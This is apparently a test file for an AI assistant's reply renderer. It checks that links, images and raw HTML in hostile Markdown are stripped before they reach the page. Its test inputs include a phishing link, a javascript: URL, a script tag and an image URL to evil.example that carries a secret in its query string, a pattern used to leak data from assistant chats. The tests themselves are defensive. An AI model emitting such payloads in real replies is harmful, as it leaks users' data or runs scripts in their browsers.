// bun test src/app/assistant - what reaches the DOM when a reply carries hostile Markdown.
import { describe, expect, test } from 'bun:test'
import { renderToStaticMarkup } from 'react-dom/server'
import { ReplyMarkdown } from './reply-markdown'

const render = (text: string) => renderToStaticMarkup(<ReplyMarkdown text={text} />)

describe('assistant reply rendering', () => {
  test('formatting renders, no literal markers', () => {
    const html = render('**"Sales events budget"**: capped.\n\n- first\n- second\n\n1. one\n\nUse `create_request`.')
    expect(html).toContain('<strong>&quot;Sales events budget&quot;</strong>')
    expect(html).toMatch(/<ul>\s*<li>first<\/li>/)
    expect(html).toMatch(/<ol>\s*<li>one<\/li>/)
    expect(html).toContain('<code>create_request</code>')
    expect(html).not.toContain('**')
  })

  test('links lose their target, keep their text', () => {
    const html = render('See [the policy](https://evil.example/phish) and [js](javascript:alert(1)).')
    expect(html).not.toMatch(/<a[\s>]/i)
    expect(html).not.toContain('evil.example')
    expect(html).not.toMatch(/javascript:/i)
    expect(html).toContain('the policy')
  })

  test('images are dropped, so nothing is fetched on render', () => {
    const html = render('![x](https://evil.example/leak?q=SECRET)')
    expect(html).not.toMatch(/<img/i)
    expect(html).not.toContain('evil.example')
  })

  test('raw HTML is dropped', () => {
    const html = render('<img src="https://evil.example/x.png"><script>alert(1)</script><a href="https://evil.example">raw</a>')
    expect(html).not.toMatch(/<(img|script|a)[\s>]/i)
    expect(html).not.toContain('evil.example')
  })
})
